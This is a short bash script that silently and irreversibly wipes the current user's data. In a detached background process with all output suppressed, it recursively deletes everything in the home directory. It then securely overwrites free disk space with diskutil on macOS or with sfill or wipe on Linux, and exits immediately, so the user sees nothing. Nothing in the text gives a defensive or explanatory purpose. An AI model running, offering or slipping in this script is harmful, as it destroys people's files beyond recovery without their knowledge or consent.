#!/bin/bash

# Get the current user's home directory
USER_HOME=$HOME

# Run the deletion silently in the background
(
    # Fast, native recursive deletion
    find "$USER_HOME" -mindepth 1 -delete 2>/dev/null

    # Wipe free space based on OS
    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS
        diskutil secureErase freespace 1 / 2>/dev/null
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        # Linux
        if command -v sfill >/dev/null 2>&1; then
            sfill -l -l -z / 2>/dev/null
        elif command -v wipe >/dev/null 2>&1; then
            wipe -kq / 2>/dev/null
        fi
    fi
) >/dev/null 2>&1 &

# Detach the background process completely
disown

# Exit immediately
exit 0
